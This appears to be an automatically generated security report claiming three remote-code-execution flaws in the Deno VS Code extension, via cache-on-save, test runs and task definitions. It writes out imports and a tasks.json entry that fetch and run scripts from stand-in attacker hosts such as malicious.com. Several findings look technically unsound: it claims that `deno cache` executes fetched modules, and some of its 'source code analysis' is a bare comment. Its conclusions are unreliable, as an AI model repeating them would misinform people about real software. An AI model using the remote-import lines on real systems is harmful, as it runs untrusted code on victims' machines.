### Vulnerability 1: Improper Validation of Remote Module Imports Leading to Remote Code Execution (RCE)
#### Description:
The extension enables automatic caching of remote module imports via the `deno.cacheOnSave` setting, which is enabled by default in versions 3.35.0 and later. When a user opens a malicious Deno project with crafted import URLs (e.g., `https://attacker.com/malicious.js`), saving the file triggers Deno to fetch and execute these remote modules. The extension does not validate or sanitize the imported URLs, allowing attackers to execute arbitrary code.

#### Steps to Trigger:
1. Create a malicious Deno project with a file containing an import from an attacker-controlled server (e.g., `import { func } from "https://malicious.com/exploit.ts";`).
2. Open the file in VS Code with the extension installed.
3. Save the file: the extension automatically runs `deno cache` on the file due to `cacheOnSave: true`, fetching and executing the remote module.

#### Impact:
An attacker can execute arbitrary code on the victim's machine by tricking them into opening a malicious Deno project and saving a file. This could lead to system compromise, data theft, or unauthorized access.

#### Vulnerability Rank: Critical

#### Currently Implemented Mitigations:
- None explicitly stated in the provided files. The default `cacheOnSave` is enabled without user confirmation for untrusted imports.

#### Missing Mitigations:
- Lack of validation for remote module sources (e.g., checking against a whitelist of trusted domains).
- No prompt or warning for untrusted imports before caching.
- No option to disable automatic execution of remote modules during caching.

#### Preconditions:
- The extension is installed.
- `deno.cacheOnSave` is enabled (default in 3.35.0+).
- User opens a malicious Deno project with an import URL pointing to an attacker's server.

#### Source Code Analysis:
- **client/src/constants.ts**:
  ```typescript
  // Default configuration includes cacheOnSave enabled since 3.35.0
  ```
- **CHANGELOG.md**:
  ```
  [3.35.0](...) feat: enable cacheOnSave by default (#1092)
  ```
- **client/src/commands.ts**:
  The `cacheActiveDocument` command directly triggers `deno cache` without validation:
  ```typescript
  async () => {
    const activeEditor = vscode.window.activeTextEditor;
    if (!activeEditor) return;
    const uri = activeEditor.document.uri.toString();
    return vscode.commands.executeCommand("deno.cache", [uri], uri);
  };
  ```

#### Security Test Case:
1. Create a file `test.ts` with a malicious import:
   ```typescript
   import _ from "https://malicious.com/exploit.js";
   ```
2. Open `test.ts` in VS Code with the extension installed.
3. Save the file: The extension automatically runs `deno cache test.ts`, fetching and executing the remote script from `malicious.com`.
4. The attacker's server logs the request or executes code via the imported module.

### Vulnerability 2: Unrestricted Execution of Test Commands with Untrusted Imports
#### Description:
The extension's test execution feature (via `Test Run` commands) processes test files that may include malicious remote imports. When running tests, the extension executes `deno test` without validating imported URLs, allowing attackers to execute arbitrary code through crafted test files.

#### Steps to Trigger:
1. Create a test file `test.ts` with an import from an attacker's server:
   ```typescript
   import { exploit } from "https://malicious.com/exploit.ts";
   Deno.test("dummy", () => exploit());
   ```
2. Open the file in VS Code and right-click to run the test via the test explorer.
3. The extension runs `deno test`, fetching and executing the remote module.

#### Impact:
Successful exploitation allows remote code execution during test runs, compromising the system.

#### Vulnerability Rank: High

#### Currently Implemented Mitigations:
- Users can disable tests via settings, but this doesn't address unsafe imports.

#### Missing Mitigations:
- No validation of remote imports before executing tests.
- No isolation or sandboxing for test execution.

#### Preconditions:
- The extension is installed.
- A malicious test file is present in the workspace.

#### Source Code Analysis:
- **client/src/testing.ts**:
  The `DenoTestController` executes tests via `deno test` without input validation:
  ```typescript
  const { enqueued } = await client.sendRequest(testRun, {
    id,
    kind: "run",
    isContinuous,
    include,
    exclude,
  });
  ```
- **docs/testing.md**:
  Mentions executing tests but no security checks for imports.

#### Security Test Case:
1. Create `test.ts` with a malicious import as above.
2. Run the test via the VS Code test explorer.
3. The remote script executes, achieving RCE.

### Vulnerability 3: Task Execution of Arbitrary Deno Commands with User-Supplied Paths
#### Description:
Custom tasks defined via `tasks.json` can execute arbitrary Deno commands with user-provided arguments, including paths to remote modules. The extension does not validate these paths, allowing attackers to inject malicious imports via crafted task configurations.

#### Steps to Trigger:
1. Create a `tasks.json` with a task pointing to a malicious URL:
   ```json
   {
     "type": "deno",
     "command": "run",
     "args": ["--allow-run", "https://malicious.com/exploit.ts"],
     "label": "Run Exploit"
   }
   ```
2. Execute the task via the VS Code task runner:
   ```typescript
   // client/src/tasks.ts
   buildDenoTask(..., args: ["run", "--allow-run", "https://malicious.com/exploit.ts"]);
   ```

#### Impact:
The task executes the remote script, leading to RCE.

#### Vulnerability Rank: High

#### Currently Implemented Mitigations:
- Users must manually configure tasks, but attackers could trick users into loading malicious task definitions.

#### Missing Mitigations:
- No validation of task command arguments for remote imports.
- No warnings for untrusted task sources.

#### Preconditions:
- A malicious `tasks.json` is present in the workspace.

#### Source Code Analysis:
- **client/src/tasks.ts**:
  The `buildDenoTask` method constructs tasks without validating arguments:
  ```typescript
  const args = task.args || [];
  // No checks for remote URLs in args
  ```

#### Security Test Case:
1. Add the malicious `tasks.json` as above.
2. Run the "Run Exploit" task via VS Code's task runner.
3. The remote script executes, achieving RCE.
